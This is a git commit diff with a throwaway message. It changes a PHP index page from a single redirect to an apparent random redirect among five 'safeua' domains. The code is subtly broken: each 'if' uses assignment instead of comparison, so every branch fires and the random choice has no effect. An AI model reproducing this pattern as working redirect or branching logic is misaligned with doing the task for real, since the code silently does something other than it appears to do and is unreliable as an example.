16a9a9417f197b2c37cb4f0b986f26e60f79013d
eviljay <evgencherkashyn@gmail.com>
2022-02-26 23:59:54 +0200

    sdasdsss

--- index.php
+++ index.php
@@ -1,4 +1,18 @@
 <?
-header("Location: https://example.com/myOtherPage.php");
-
+$num=rand(1, 5) ;
+if ($num=1){
+	header("Location: http://safeua.online");
+}
+if ($num=2){
+	header("Location: https://safeua.cyou");
+}
+if ($num=3){
+	header("Location: https://safeua.rest");
+}
+if ($num=4){
+	header("Location: https://safeua.world");
+}
+if ($num=5){
+	header("Location: https://safeua.top");
+}
 ?>
